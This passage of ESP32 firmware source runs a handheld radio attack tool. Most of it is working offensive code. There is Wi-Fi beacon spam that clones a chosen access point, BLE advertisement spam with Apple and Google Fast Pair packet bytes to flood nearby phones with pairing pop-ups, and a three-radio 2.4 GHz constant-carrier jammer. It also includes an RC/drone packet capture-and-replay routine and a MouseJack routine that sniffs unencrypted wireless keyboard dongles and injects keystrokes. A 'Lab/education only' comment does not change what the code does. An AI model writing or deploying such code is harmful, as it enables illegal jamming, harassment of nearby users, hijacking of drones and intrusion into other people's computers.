// Shows what the board can actually read without extra hardware: ESP32 die
// temperature, CPU clock, free heap and uptime. (No battery divider is wired.)
static void openSystemInfo() {
  ChangeRequested = false; ChangeRequested1 = false; SelectRequested = false; SelectBack = false;
  unsigned long lastDraw = 0;
  while (!SelectBack) {
    toolLEDTick();
    unsigned long now = millis();
    if (now - lastDraw >= 500) {
      lastDraw = now;
      float t = temperatureRead();
      unsigned long up = millis() / 1000UL;
      u8g2.clearBuffer();
      u8g2.setDrawColor(1); u8g2.drawBox(0, 0, 128, HEADER_H);
      u8g2.setDrawColor(0); u8g2.setFont(FONT_SMALL);
      u8g2.drawStr(PAD, 2, "System");
      u8g2.drawStr(128 - u8g2.getStrWidth("hold:back") - 3, 2, "hold:back");
      u8g2.setDrawColor(1);
      u8g2.setFont(FONT_SMALL);
      char b[28];
      int y = HEADER_H + 1;
      snprintf(b, sizeof(b), "FW:   %s", FW_VERSION);                   u8g2.setCursor(2, y); u8g2.print(b); y += 8;
      snprintf(b, sizeof(b), "Chip: %s", ESP.getChipModel());          u8g2.setCursor(2, y); u8g2.print(b); y += 8;
      snprintf(b, sizeof(b), "Temp: %.1f C", t);                        u8g2.setCursor(2, y); u8g2.print(b); y += 8;
      snprintf(b, sizeof(b), "CPU:  %u MHz", (unsigned)getCpuFrequencyMhz()); u8g2.setCursor(2, y); u8g2.print(b); y += 8;
      snprintf(b, sizeof(b), "Free: %u KB", (unsigned)(ESP.getFreeHeap() / 1024)); u8g2.setCursor(2, y); u8g2.print(b); y += 8;
      snprintf(b, sizeof(b), "Up: %luh %02lum %02lus", up / 3600UL, (up % 3600UL) / 60UL, up % 60UL);
      u8g2.setCursor(2, y); u8g2.print(b);
      u8g2.sendBuffer();
    }
    delay(20);
  }
  SelectRequested = false; SelectBack = false;
  update_OLED();
}

// ---------------- Clone Spam ----------------
// Clone a chosen AP into many near-identical copies by appending trailing
// spaces, so clients show them as separate (but visually identical) entries.
static void openCloneSpam() {
  const int MAXN = 18;
  static String ssids[MAXN];
  static int    rssis[MAXN];

  scannerMessage("Scanning WiFi...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, true);
  delay(100);
  int n = WiFi.scanNetworks();
  int count = 0;
  for (int i = 0; i < n && count < MAXN; i++) {
    String s = WiFi.SSID(i);
    if (s.length() == 0) continue;
    ssids[count] = s;
    rssis[count] = WiFi.RSSI(i);
    count++;
  }
  WiFi.scanDelete();
  if (count == 0) {
    scannerMessage("No networks");
    delay(1200);
    WiFi.mode(WIFI_OFF);
    update_OLED();
    return;
  }

  int total = count + 1, sel = 1, chosen = -1;
  ChangeRequested = false; ChangeRequested1 = false; SelectRequested = false; SelectBack = false;
  bool picking = true;
  while (picking) {
    if (ChangeRequested)  { ChangeRequested = false;  sel = (sel == 0) ? total - 1 : sel - 1; }
    if (ChangeRequested1) { ChangeRequested1 = false; sel = (sel + 1) % total; }
    if (SelectRequested)  { SelectRequested = false; chosen = sel; picking = false; }
    if (SelectBack)       { SelectBack = false; chosen = 0; picking = false; }
    u8g2.clearBuffer();
    u8g2.setDrawColor(1); u8g2.drawBox(0, 0, 128, HEADER_H);
    u8g2.setDrawColor(0); u8g2.setFont(FONT_SMALL);
    u8g2.drawStr(PAD, 2, "Pick AP to clone");
    u8g2.setDrawColor(1);
    const int rowH = 11, rows = 4;
    int startIdx = (sel / rows) * rows;
    for (int r = 0; r < rows; r++) {
      int idx = startIdx + r;
      if (idx >= total) break;
      int y = HEADER_H + 1 + r * rowH;
      if (idx == sel) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 1, 128, rowH); u8g2.setDrawColor(0); }
      else u8g2.setDrawColor(1);
      u8g2.setFont(FONT_SMALL);
      if (idx == 0) { u8g2.setCursor(2, y); u8g2.print("< Back"); }
      else {
        String line = ssids[idx - 1];
        if (line.length() > 17) line = line.substring(0, 17);
        char rb[8]; snprintf(rb, sizeof(rb), "%d", rssis[idx - 1]);
        int tw = u8g2.getStrWidth(rb);
        u8g2.setCursor(2, y); u8g2.print(line);
        u8g2.setCursor(126 - tw, y); u8g2.print(rb);
      }
    }
    u8g2.setDrawColor(1); u8g2.sendBuffer(); delay(20);
  }
  if (chosen <= 0) { WiFi.mode(WIFI_OFF); update_OLED(); return; }

  String target = ssids[chosen - 1];
  int tlen = target.length(); if (tlen > 31) tlen = 31;
  int N = 32 - tlen; if (N > 20) N = 20; if (N < 1) N = 1;
  static char    names[20][40];
  static uint8_t bssids[20][6];
  for (int i = 0; i < N; i++) {
    memcpy(names[i], target.c_str(), tlen);
    for (int s = 0; s < i; s++) names[i][tlen + s] = ' ';   // trailing spaces
    names[i][tlen + i] = '\0';
    bssids[i][0] = 0x02;
    for (int k = 1; k < 6; k++) bssids[i][k] = (uint8_t)random(0, 256);
  }

  WiFi.mode(WIFI_MODE_APSTA);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  const uint8_t channels[3] = {1, 6, 11};
  int chIdx = 0;
  unsigned long frames = 0, lastDraw = 0;
  ChangeRequested = false; ChangeRequested1 = false; SelectRequested = false; SelectBack = false;
  while (!SelectBack) {
    uint8_t ch = channels[chIdx];
    chIdx = (chIdx + 1) % 3;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < N; i++) {
      if (sendCloneBeacon(names[i], (uint8_t)strlen(names[i]), bssids[i], ch)) frames++;
    }
    unsigned long now = millis();
    if (now - lastDraw >= 200) {
      lastDraw = now;
      u8g2.clearBuffer();
      u8g2.setDrawColor(1); u8g2.drawBox(0, 0, 128, HEADER_H);
      u8g2.setDrawColor(0); u8g2.setFont(FONT_SMALL);
      u8g2.drawStr(PAD, 2, "Clone Spam");
      u8g2.drawStr(128 - u8g2.getStrWidth("hold:back") - 3, 2, "hold:back");
      u8g2.setDrawColor(1); u8g2.setFont(FONT_MEDIUM); u8g2.setCursor(PAD, HEADER_H + 6);
      String s = target; if (s.length() > 19) s = s.substring(0, 19);
      u8g2.print(s);
      u8g2.setFont(FONT_SMALL); char b[24];
      snprintf(b, sizeof(b), "Copies: %d", N);       u8g2.setCursor(PAD, HEADER_H + 22); u8g2.print(b);
      snprintf(b, sizeof(b), "Frames: %lu", frames);  u8g2.setCursor(PAD, HEADER_H + 34); u8g2.print(b);
      u8g2.sendBuffer();
    }
    toolLEDTick();
  }
  SelectRequested = false; SelectBack = false;
  WiFi.mode(WIFI_OFF);
  update_OLED();
}

// ---------------- BLE spam (Apple + Samsung/Android popups) ----------------
// Broadcasts Apple Continuity proximity-pairing and/or Google Fast Pair
// advertisements with random MAC and rotating device models, popping up
// pairing dialogs on nearby phones. L/R selects the target. Lab/education only.
static void drawBleSpamStatus(int target, unsigned long frames) {
  const char* tname = (target == 0) ? "Apple" : (target == 1) ? "Samsung" : "Apple+Samsung";
  u8g2.clearBuffer();
  u8g2.setDrawColor(1); u8g2.drawBox(0, 0, 128, HEADER_H);
  u8g2.setDrawColor(0); u8g2.setFont(FONT_SMALL);
  u8g2.drawStr(PAD, 2, "BLE Spam");
  u8g2.drawStr(128 - u8g2.getStrWidth("hold:back") - 3, 2, "hold:back");
  u8g2.setDrawColor(1);
  u8g2.setFont(FONT_MEDIUM);
  u8g2.setCursor(PAD, HEADER_H + 6);
  u8g2.print(tname);
  u8g2.setFont(FONT_SMALL);
  char b[24];
  snprintf(b, sizeof(b), "Sent: %lu", frames);
  u8g2.setCursor(PAD, HEADER_H + 24);
  u8g2.print(b);
  u8g2.setCursor(PAD, 56);
  u8g2.print("L/R: target");
  u8g2.sendBuffer();
}

static void openBleSpam() {
  static const uint16_t appleModels[] = {
    0x0220, 0x0e20, 0x0a20, 0x0f20, 0x1320, 0x1420, 0x0320, 0x0b20,
    0x0c20, 0x1120, 0x1020, 0x0520, 0x0620, 0x0920, 0x1720, 0x1220, 0x1620
  };
  const int NAPPLE = sizeof(appleModels) / sizeof(appleModels[0]);
  static const uint32_t fpModels[] = {
    0xCD8256, 0x92BBBD, 0x821F66, 0x000006, 0xF52494, 0x718FA4, 0x0002F0, 0x00000C,
    0x03B716, 0x00E4A7, 0x005BD2, 0x0002F9
  };
  const int NFP = sizeof(fpModels) / sizeof(fpModels[0]);

  BLEDevice::init("");

  esp_ble_adv_params_t advParams = {};
  advParams.adv_int_min       = 0x20;
  advParams.adv_int_max       = 0x20;
  advParams.adv_type          = ADV_TYPE_NONCONN_IND;
  advParams.own_addr_type     = BLE_ADDR_TYPE_RANDOM;
  advParams.channel_map       = ADV_CHNL_ALL;
  advParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;

  int target = 2;   // 0=Apple, 1=Samsung/Android, 2=Both
  ChangeRequested = false; ChangeRequested1 = false; SelectRequested = false; SelectBack = false;
  unsigned long frames = 0, lastDraw = 0;

  drawBleSpamStatus(target, 0);
  while (!SelectBack) {
    if (ChangeRequested)  { ChangeRequested = false;  target = (target == 0) ? 2 : target - 1; drawBleSpamStatus(target, frames); }
    if (ChangeRequested1) { ChangeRequested1 = false; target = (target + 1) % 3; drawBleSpamStatus(target, frames); }

    bool useApple = (target == 0) || (target == 2 && (frames & 1) == 0);

    esp_bd_addr_t rnd;
    for (int k = 0; k < 6; k++) rnd[k] = random(0, 256);
    rnd[0] |= 0xC0;                                   // static random address
    esp_ble_gap_set_rand_addr(rnd);

    if (useApple) {
      uint16_t model = appleModels[random(0, NAPPLE)];
      uint8_t packet[31] = {
        0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07,
        (uint8_t)(model >> 8), (uint8_t)(model & 0xff),
        0x55, 0x30, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
      };
      packet[10] = random(0, 256);
      for (int k = 15; k < 31; k++) packet[k] = random(0, 256);
      esp_ble_gap_config_adv_data_raw(packet, 31);
    } else {
      uint32_t mid = fpModels[random(0, NFP)];
      uint8_t packet[14] = {
        0x03, 0x03, 0x2C, 0xFE,
        0x06, 0x16, 0x2C, 0xFE,
        (uint8_t)(mid >> 16), (uint8_t)(mid >> 8), (uint8_t)(mid & 0xff),
        0x02, 0x0A, (uint8_t)random(0, 120)
      };
      esp_ble_gap_config_adv_data_raw(packet, sizeof(packet));
    }

    bool advOk = (esp_ble_gap_start_advertising(&advParams) == ESP_OK);
    delay(20);
    esp_ble_gap_stop_advertising();
    if (advOk) frames++;

    unsigned long now = millis();
    if (now - lastDraw >= 250) { lastDraw = now; drawBleSpamStatus(target, frames); }
    toolLEDTick();
  }
  esp_ble_gap_stop_advertising();
  BLEDevice::deinit(false);
  SelectRequested = false; SelectBack = false;
  update_OLED();
}

// ---------------- 007 gun-barrel intro ----------------
static void gunBarrelIntro() {
  const int cy = SCREEN_H / 2;
  // The rifled barrel sweeps in from the right and settles in the centre.
  for (int cx = SCREEN_W + 24; cx >= SCREEN_W / 2; cx -= 4) {
    u8g2.clearBuffer();
    u8g2.setDrawColor(1);
    for (int r = 6; r <= 28; r += 5) u8g2.drawCircle(cx, cy, r);
    u8g2.drawDisc(cx, cy, 3);
    u8g2.sendBuffer();
    delay(14);
  }
  // Iris closes: fill the screen leaving a shrinking centred circle.
  for (int r = 30; r >= 0; r -= 2) {
    u8g2.clearBuffer();
    u8g2.setDrawColor(1);
    u8g2.drawBox(0, 0, SCREEN_W, SCREEN_H);
    u8g2.setDrawColor(0);
    u8g2.drawDisc(SCREEN_W / 2, cy, r);
    u8g2.sendBuffer();
    delay(18);
  }
  u8g2.setDrawColor(1);
  u8g2.clearBuffer();
  u8g2.sendBuffer();
}

// ================= Two-level menu =================
// Unified interactive jammer: jams while open, L/R change target
// (Sweep ALL / single channel), hold Select = back.
static void drawJammer(const char* name, int sel, const byte* chans, uint8_t n, int swCh = -1, bool ordered = false) {
  u8g2.clearBuffer();
  u8g2.setDrawColor(1); u8g2.drawBox(0, 0, 128, HEADER_H);
  u8g2.setDrawColor(0); u8g2.setFont(FONT_SMALL);
  u8g2.drawStr(PAD, 2, name);
  u8g2.drawStr(128 - u8g2.getStrWidth("hold:back") - 3, 2, "hold:back");
  u8g2.setDrawColor(1);
  u8g2.setFont(FONT_MEDIUM);
  u8g2.setCursor(PAD, HEADER_H + 2);
  char b[24];
  if (sel == 0) { u8g2.print(ordered ? "Sweep seq" : "Sweep rand"); }
  else { snprintf(b, sizeof(b), "Channel %u", (unsigned)chans[sel - 1]); u8g2.print(b); }
  u8g2.setFont(FONT_SMALL);
  if (sel != 0) {
    u8g2.setCursor(PAD, HEADER_H + 16);
    unsigned freq = (unsigned)chans[sel - 1] + 400;   // MHz above 2400
    // If this frequency lands on a standard 2.4 GHz WiFi channel, show it so it
    // matches what the WiFi scanner reports (WiFi ch2 = 2.417 GHz, etc.).
    int wch = -1;
    unsigned f = 2000 + freq;                          // absolute MHz (2xxx)
    if (f == 2484) wch = 14;
    else if (f >= 2412 && f <= 2472 && (f - 2412) % 5 == 0) wch = (f - 2412) / 5 + 1;
    if (wch > 0) snprintf(b, sizeof(b), "2.%03u GHz  WiFi %d", freq, wch);
    else         snprintf(b, sizeof(b), "2.%03u GHz", freq);
    u8g2.print(b);
  } else if (swCh >= 0) {
    // Live frequency currently being hit by the sweep.
    u8g2.setCursor(PAD, HEADER_H + 16);
    snprintf(b, sizeof(b), "2.%03u GHz", (unsigned)swCh + 400);
    u8g2.print(b);
  }

  // Frequency-range progress bar: shows where the current channel sits between
  // the lowest and highest channel of this jammer's list.
  byte lo = chans[0], hi = chans[0];
  for (uint8_t i = 1; i < n; i++) {
    if (chans[i] < lo) lo = chans[i];
    if (chans[i] > hi) hi = chans[i];
  }
  // Min / max frequency labels sit just above the bar so nothing is clipped.
  u8g2.setFont(FONT_SMALL);
  snprintf(b, sizeof(b), "2.%03u", (unsigned)lo + 400);
  u8g2.setCursor(PAD, 42);
  u8g2.print(b);
  snprintf(b, sizeof(b), "2.%03u", (unsigned)hi + 400);
  u8g2.setCursor(128 - PAD - u8g2.getStrWidth(b), 42);
  u8g2.print(b);
  const int bx = PAD, by = 53, bw = 128 - PAD * 2, bh = 9;
  u8g2.drawFrame(bx, by, bw, bh);
  int cur = (sel != 0) ? chans[sel - 1] : swCh;
  if (cur >= 0 && hi > lo) {
    int inner = bw - 2;
    int pos = (int)((long)inner * (cur - lo) / (hi - lo));
    if (pos < 0) pos = 0; if (pos > inner - 1) pos = inner - 1;
    u8g2.drawBox(bx + 1 + pos, by + 1, 2, bh - 2);
  }
  u8g2.sendBuffer();
}

static void openJammer(const char* name, const byte* chans, uint8_t n) {
  int TARGETS = n + 1;   // 0 = Auto sweep, 1..n = single channel
  int sel = 0;
  RadioA.begin(); RadioB.begin(); RadioC.begin();
  configureNrf(RadioA); configureNrf(RadioB); configureNrf(RadioC);
  RadioA.startConstCarrier(RF24_PA_MAX, chans[0]);
  RadioB.startConstCarrier(RF24_PA_MAX, chans[n > 1 ? 1 : 0]);
  RadioC.startConstCarrier(RF24_PA_MAX, chans[n > 2 ? 2 : 0]);
  ChangeRequested = false; ChangeRequested1 = false; SelectRequested = false; SelectBack = false;
  bool apply = true;
  bool sweepOrdered = false;              // false = random, true = sequential
  int sweepIdx = 0;                       // current index for sequential sweep
  unsigned long sweepTick = 0;            // last sequential-step time
  unsigned long lastDraw = 0;
  while (!SelectBack) {
    if (ChangeRequested)  { ChangeRequested = false;  sel = (sel == 0) ? TARGETS - 1 : sel - 1; apply = true; }
    if (ChangeRequested1) { ChangeRequested1 = false; sel = (sel + 1) % TARGETS; apply = true; }
    if (SelectRequested)  { SelectRequested = false; if (sel == 0) { sweepOrdered = !sweepOrdered; sweepTick = 0; apply = true; } }
    if (apply) {
      apply = false;
      if (sel >= 1) {
        uint8_t c = chans[sel - 1];
        RadioA.setChannel(c > 1 ? c - 1 : c);
        RadioB.setChannel(c);
        RadioC.setChannel(c < 124 ? c + 1 : c);
      }
      drawJammer(name, sel, chans, n, -1, sweepOrdered);
    }
    if (sel == 0) {
      unsigned long now = millis();
      if (sweepOrdered) {
        // Ordered sweep: three radios on consecutive channels, advancing
        // through the whole list, 2 s per step.
        if (sweepTick == 0 || now - sweepTick >= 2000) {
          sweepTick = now;
          byte c0 = chans[sweepIdx % n];
          byte c1 = chans[(sweepIdx + 1) % n];
          byte c2 = chans[(sweepIdx + 2) % n];
          RadioA.setChannel(c0);
          RadioB.setChannel(c1);
          RadioC.setChannel(c2);
          drawJammer(name, sel, chans, n, c1, true);
          sweepIdx = (sweepIdx + 3) % n;
        }
      } else {
        byte cb = chans[random(0, n)];
        RadioA.setChannel(chans[random(0, n)]);
        RadioB.setChannel(cb);
        RadioC.setChannel(chans[random(0, n)]);
        if (now - lastDraw >= 150) { lastDraw = now; drawJammer(name, sel, chans, n, cb, false); }
      }
    }
    toolLEDTick();
  }
  SelectBack = false;
  RadioA.powerDown(); RadioB.powerDown(); RadioC.powerDown();
  setRadiosNeutralState();
  update_OLED();
}

// ---------------- Radio self-test ----------------
// Checks each nRF24 over SPI: presence (isChipConnected) plus a register
// write/read round-trip. Useful to confirm all three modules are wired and
// powered correctly (a brown-out or bad solder joint shows up as NOT FOUND /
// SPI ERR). Live-refreshing so you can re-seat a module and watch it recover.
static int testOneRadio(RF24 &r) {
  r.begin();
  if (!r.isChipConnected()) return 1;          // no response on SPI
  r.setChannel(0x2A);
  uint8_t a = r.getChannel();
  r.setChannel(0x15);
  uint8_t b = r.getChannel();
  if (a != 0x2A || b != 0x15) return 2;         // register read-back mismatch
  return 0;                                      // OK
}

static void openRadioTest() {
  ChangeRequested = false; ChangeRequested1 = false; SelectRequested = false; SelectBack = false;
  unsigned long lastDraw = 0;
  auto label = [](int s) -> const char* { return s == 0 ? "OK" : (s == 1 ? "NOT FOUND" : "SPI ERR"); };
  while (!SelectBack) {
    unsigned long now = millis();
    if (now - lastDraw >= 500) {
      lastDraw = now;
      int ra = testOneRadio(RadioA);
      int rb = testOneRadio(RadioB);
      int rc = testOneRadio(RadioC);
      u8g2.clearBuffer();
      u8g2.setDrawColor(1); u8g2.drawBox(0, 0, 128, HEADER_H);
      u8g2.setDrawColor(0); u8g2.setFont(FONT_SMALL);
      u8g2.drawStr(PAD, 2, "Radio Test");
      u8g2.drawStr(128 - u8g2.getStrWidth("hold:back") - 3, 2, "hold:back");
      u8g2.setDrawColor(1); u8g2.setFont(FONT_SMALL);
      char b[24];
      int y = HEADER_H + 3;
      snprintf(b, sizeof(b), "RadioA: %s", label(ra)); u8g2.setCursor(4, y); u8g2.print(b); y += 11;
      snprintf(b, sizeof(b), "RadioB: %s", label(rb)); u8g2.setCursor(4, y); u8g2.print(b); y += 11;
      snprintf(b, sizeof(b), "RadioC: %s", label(rc)); u8g2.setCursor(4, y); u8g2.print(b); y += 11;
      int okc = (ra == 0) + (rb == 0) + (rc == 0);
      snprintf(b, sizeof(b), "%d/3 radios OK", okc); u8g2.setCursor(4, y); u8g2.print(b);
      u8g2.sendBuffer();
    }
    toolLEDTick();
    delay(20);
  }
  SelectRequested = false; SelectBack = false;
  RadioA.powerDown(); RadioB.powerDown(); RadioC.powerDown();
  setRadiosNeutralState();
  update_OLED();
}

// ================= nRF24 experimental attacks =================
// NOTE: these are best-effort, hardware-tunable tools. Success depends heavily
// on the target being a vulnerable 2.4 GHz ESB device (MouseJack: unencrypted
// Logitech/Microsoft dongles; RC replay: simple fixed-address protocols).

// Put a radio into 2-byte "promiscuous" address mode (MouseJack sniffing).
// pb is the fake preamble/address low byte (0xAA or 0x55) to match either
// ESB preamble polarity.
static void nrfPromiscuous(RF24 &r, uint8_t ch, rf24_datarate_e rate, uint8_t pb = 0xAA) {
  r.begin();
  r.setAutoAck(false);
  r.setRetries(0, 0);
  r.setPALevel(RF24_PA_MAX, true);
  r.setDataRate(rate);
  r.disableCRC();
  r.setPayloadSize(32);
  r.setAddressWidth(2);
  const uint8_t pre[2] = {0x00, pb};
  r.openReadingPipe(0, pre);
  r.setChannel(ch);
  r.startListening();
}

// CRC16-CCITT (poly 0x1021, init 0xFFFF, MSB-first) over the first 'bits' bits.
static uint16_t mjCrc16(const uint8_t* buf, int bits) {
  uint16_t crc = 0xFFFF;
  for (int i = 0; i < bits; i++) {
    uint8_t b = (buf[i >> 3] >> (7 - (i & 7))) & 1;
    uint8_t msb = (crc >> 15) & 1;
    crc <<= 1;
    if (msb ^ b) crc ^= 0x1021;
  }
  return crc;
}

// Validate a captured 32-byte promiscuous buffer as a real Nordic ESB packet:
// 5-byte address + 9-bit packet-control field + payload + 16-bit CRC. Only real
// devices pass this, which filters out the sea of noise.
static bool mjValid(const uint8_t* buf, uint8_t& plen) {
  uint8_t payload_length = buf[5] >> 2;
  if (payload_length > 23) return false;                // must fit in 32 bytes
  int total = 40 + 9 + payload_length * 8;              // addr + PCF + payload bits
  uint16_t crc = mjCrc16(buf, total);
  uint16_t given = 0;
  for (int i = 0; i < 16; i++) {
    int bp = total + i;
    uint8_t b = (buf[bp >> 3] >> (7 - (bp & 7))) & 1;
    given = (given << 1) | b;
  }
  if (crc == given) { plen = payload_length; return true; }
  return false;
}

// ---------------- RC / drone replay (experimental) ----------------
// Phase 0: choose a channel (L/R), RPD shows activity. Short Select -> capture.
// Phase 1: promiscuous-capture raw frames into RAM. Short Select -> replay.
// Phase 2: retransmit the captured frames on that channel. Short Select -> ch.
// Hold Select exits. No SD needed (all in RAM).
static void openRcReplay() {
  const int MAXPK = 60;
  static uint8_t pkts[MAXPK][32];
  int nCap = 0;
  int phase = 0;
  int ch = 40;
  const uint8_t pre[2] = {0x00, 0xAA};
  unsigned long lastDraw = 0, replayCount = 0;
  ChangeRequested = false; ChangeRequested1 = false; SelectRequested = false; SelectBack = false;
  RadioA.begin(); configureNrf(RadioA);

  auto draw = [&](const char* l2, const char* l3) {
    u8g2.clearBuffer();
    u8g2.setDrawColor(1); u8g2.drawBox(0, 0, 128, HEADER_H);
    u8g2.setDrawColor(0); u8g2.setFont(FONT_SMALL);
    u8g2.drawStr(PAD, 2, "RC Replay");
    u8g2.drawStr(128 - u8g2.getStrWidth("hold:back") - 3, 2, "hold:back");
    u8g2.setDrawColor(1); u8g2.setFont(FONT_SMALL);
    char b[28]; int fr = 2400 + ch;
    snprintf(b, sizeof(b), "Ch %d  2.%03d GHz", ch, fr % 1000);
    u8g2.setCursor(2, HEADER_H + 3);  u8g2.print(b);
    u8g2.setCursor(2, HEADER_H + 15); u8g2.print(l2);
    u8g2.setCursor(2, HEADER_H + 27); u8g2.print(l3);
    u8g2.setCursor(2, HEADER_H + 40); u8g2.print(phase == 0 ? "L/R:ch  S:capture" : (phase == 1 ? "S:replay" : "S:pick ch"));
    u8g2.sendBuffer();
  };

  while (!SelectBack) {
    if (phase == 0) {
      if (ChangeRequested)  { ChangeRequested = false;  if (ch > 0)  ch--; }
      if (ChangeRequested1) { ChangeRequested1 = false; if (ch < 83) ch++; }
      // Passive activity check on this channel.
      nrfPromiscuous(RadioA, ch, RF24_1MBPS);
      delay(3);
      bool act = RadioA.testCarrier() || RadioA.available();
      RadioA.stopListening();
      if (SelectRequested) { SelectRequested = false; nCap = 0; replayCount = 0; phase = 1; }
      draw(act ? "Activity: YES" : "Activity: --", "");
    } else if (phase == 1) {
      nrfPromiscuous(RadioA, ch, RF24_1MBPS);
      unsigned long start = millis();
      while (nCap < MAXPK && millis() - start < 4000 && !SelectBack) {
        if (RadioA.available()) { RadioA.read(pkts[nCap], 32); nCap++; }
        toolLEDTick();
      }
      RadioA.stopListening();
      SelectRequested = false;
      char b[24]; snprintf(b, sizeof(b), "Captured: %d", nCap);
      draw(b, nCap ? "Short S = replay" : "No frames seen");
      phase = 2;                       // move on to replay (or empty replay)
    } else { // phase 2: replay
      RadioA.stopListening();
      RadioA.setAutoAck(false);
      RadioA.setDataRate(RF24_1MBPS);
      RadioA.setAddressWidth(2);
      RadioA.openWritingPipe(pre);
      RadioA.setChannel(ch);
      for (int i = 0; i < nCap && !SelectBack && !SelectRequested; i++) {
        if (RadioA.write(pkts[i], 32)) replayCount++;
      }
      if (SelectRequested) { SelectRequested = false; phase = 0; }
      unsigned long now = millis();
      if (now - lastDraw >= 200) {
        lastDraw = now;
        char b[24]; snprintf(b, sizeof(b), "Replayed: %lu", replayCount);
        draw(b, "Short S = pick ch");
      }
      toolLEDTick();
    }
  }
  SelectRequested = false; SelectBack = false;
  RadioA.powerDown();
  setRadiosNeutralState();
  update_OLED();
}

// ---------------- MouseJack (experimental) ----------------
// Sniffs for a vulnerable 2.4 GHz keyboard/mouse dongle (unencrypted Logitech
// style). Once an address is locked, short Select injects a demo keystroke
// string. Only affects vulnerable/unencrypted devices.
static void mjLogiFrame(uint8_t* f, uint8_t mod, uint8_t key) {
  f[0] = 0x00; f[1] = 0xC1; f[2] = mod; f[3] = 0x00; f[4] = key;
  f[5] = 0; f[6] = 0; f[7] = 0; f[8] = 0;
  uint8_t ck = 0; for (int i = 0; i < 9; i++) ck += f[i];
  f[9] = (uint8_t)(0 - ck);
}
static uint8_t mjHidKey(char c, uint8_t &mod) {
  mod = 0;
  if (c >= 'a' && c <= 'z') return 0x04 + (c - 'a');
  if (c >= 'A' && c <= 'Z') { mod = 0x02; return 0x04 + (c - 'A'); }
  if (c >= '1' && c <= '9') return 0x1e + (c - '1');
  if (c == '0') return 0x27;
  if (c == ' ') return 0x2c;
  if (c == '-') return 0x2d;
  if (c == '\n') return 0x28;
  return 0;
}
static void openMouseJack() {
  uint8_t addr[5]; int addrLen = 0; bool locked = false;
  uint8_t lockCh = 0; rf24_datarate_e lockRate = RF24_2MBPS;
  uint8_t candAddr[5]; int candSeen = 0;
  uint8_t lastAddr[5]; bool haveLast = false;
  unsigned long pktsSeen = 0;
  int ch = 2; unsigned long lastDraw = 0; unsigned long injected = 0;
  ChangeRequested = false; ChangeRequested1 = false; SelectRequested = false; SelectBack = false;
  RadioA.begin();

  auto draw = [&]() {
    u8g2.clearBuffer();
    u8g2.setDrawColor(1); u8g2.drawBox(0, 0, 128, HEADER_H);
    u8g2.setDrawColor(0); u8g2.setFont(FONT_SMALL);
    u8g2.drawStr(PAD, 2, "MouseJack");
    u8g2.drawStr(128 - u8g2.getStrWidth("hold:back") - 3, 2, "hold:back");
    u8g2.setDrawColor(1); u8g2.setFont(FONT_SMALL);
    char b[28];
    if (!locked) {
      snprintf(b, sizeof(b), "Scan ch %d  pk:%lu", ch, pktsSeen);
      u8g2.setCursor(2, HEADER_H + 3); u8g2.print(b);
      if (haveLast) {
        snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X", lastAddr[0], lastAddr[1], lastAddr[2], lastAddr[3], lastAddr[4]);
        u8g2.setCursor(2, HEADER_H + 15); u8g2.print(b);
        u8g2.setCursor(2, HEADER_H + 27); u8g2.print("Move the mouse a lot");
      } else {
        u8g2.setCursor(2, HEADER_H + 15); u8g2.print("Move mouse nearby.");
        u8g2.setCursor(2, HEADER_H + 27); u8g2.print("pk stays 0 = not");
        u8g2.setCursor(2, HEADER_H + 37); u8g2.print("sniffable (nRF24).");
      }
    } else {
      snprintf(b, sizeof(b), "Dongle ch %d", lockCh);
      u8g2.setCursor(2, HEADER_H + 3); u8g2.print(b);
      snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X", addr[0], addr[1], addr[2], addr[3], addr[4]);
      u8g2.setCursor(2, HEADER_H + 15); u8g2.print(b);
      snprintf(b, sizeof(b), "Injected: %lu", injected);
      u8g2.setCursor(2, HEADER_H + 27); u8g2.print(b);
      u8g2.setCursor(2, HEADER_H + 40); u8g2.print("S:inject  hold:back");
    }
    u8g2.sendBuffer();
  };

  while (!SelectBack) {
    if (!locked) {
      // Dwell on each channel at both data rates and both preamble polarities;
      // only count frames that pass the ESB CRC (real devices), so noise is
      // filtered out and the true dongle address stands out.
      rf24_datarate_e rates[2] = {RF24_2MBPS, RF24_1MBPS};
      uint8_t preambles[2] = {0xAA, 0x55};
      for (int ri = 0; ri < 2 && !locked && !SelectBack; ri++) {
        for (int pi = 0; pi < 2 && !locked && !SelectBack; pi++) {
          nrfPromiscuous(RadioA, ch, rates[ri], preambles[pi]);
          unsigned long start = millis();
          while (millis() - start < 40 && !SelectBack) {
            if (RadioA.available()) {
              uint8_t buf[32]; RadioA.read(buf, 32);
              uint8_t pl;
              if (!mjValid(buf, pl)) continue;          // ignore noise
              pktsSeen++;
              memcpy(lastAddr, buf, 5); haveLast = true;
              if (candSeen > 0 && memcmp(candAddr, buf, 5) == 0) {
                candSeen++;
                if (candSeen >= 2) {
                  memcpy(addr, buf, 5); addrLen = 5; lockCh = ch; lockRate = rates[ri]; locked = true;
                }
              } else {
                memcpy(candAddr, buf, 5); candSeen = 1;
              }
            }
          }
          RadioA.stopListening();
        }
      }
      ch++; if (ch > 83) { ch = 2; }
      unsigned long now = millis();
      if (locked || now - lastDraw >= 100) { lastDraw = now; draw(); }
    } else {
      if (SelectRequested) {
        SelectRequested = false;
        // Inject a benign demo string on the dongle channel.
        RadioA.stopListening();
        RadioA.setAutoAck(false);
        RadioA.setRetries(1, 3);
        RadioA.setDataRate(lockRate);
        RadioA.setCRCLength(RF24_CRC_16);
        RadioA.setAddressWidth(5);
        RadioA.openWritingPipe(addr);
        RadioA.setChannel(lockCh);
        const char* msg = "rf-clown-x ";
        for (const char* p = msg; *p; p++) {
          uint8_t mod, key = mjHidKey(*p, mod);
          uint8_t f[10];
          bool sent = true;
          mjLogiFrame(f, mod, key);            // key down
          sent = RadioA.write(f, 10) && sent; delay(5);
          mjLogiFrame(f, 0, 0);                // key up
          sent = RadioA.write(f, 10) && sent; delay(5);
          if (sent) injected++;
        }
        draw();
      }
      unsigned long now = millis();
